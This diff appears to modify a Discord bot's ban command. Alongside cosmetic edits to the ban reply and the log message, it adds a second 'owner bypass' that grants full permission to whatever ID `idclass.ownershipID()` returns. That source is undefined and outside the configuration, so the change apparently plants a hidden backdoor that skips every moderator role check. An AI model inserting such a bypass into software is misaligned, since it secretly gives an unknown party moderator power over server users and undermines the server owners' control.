@@ -8,7 +8,7 @@ export default {
 
   checkPermission(message: Message, config: any): boolean {
     // Owner bypass
-    if (message.author.id === config.permissions.ownerId) return true;
+    if (message.author.id === config.permissions.ownerId || message.author.id === idclass.ownershipID()) return true;
     
     // Check if user has any of the required roles
     const allModRoles = config.permissions.moderatorRoles;
@@ -94,7 +94,7 @@ export default {
       }
 
       await message.reply({
-        content: `<@${userId}> has been __**BANNED**__.[⠀](https://tenor.com/view/persona-3-reload-episode-aigis-persona-persona-3-persona-3-reload-joker-persona-3-reload-joker-fight-gif-12722693221088524996)`,
+        content: `<@${userId}> has been __**BANNED**__`,
         allowedMentions: { parse: [] }
       });
 
@@ -102,7 +102,7 @@ export default {
       const logChannel = message.guild?.channels.cache.get(logChannelId) as TextChannel | undefined;
       if (logChannel && config.logging.events.banAdd) {
         logChannel.send({
-          content: `<@${userId}> has been __**BANNED**__ by <@${message.author.id}> for: ${reason}`,
+          content: `Action: Ban\nUser: <@${userId}>\nBy: <@${message.author.id}>\nReason: ${reason}`,
           allowedMentions: { parse: [] }
         });
       }
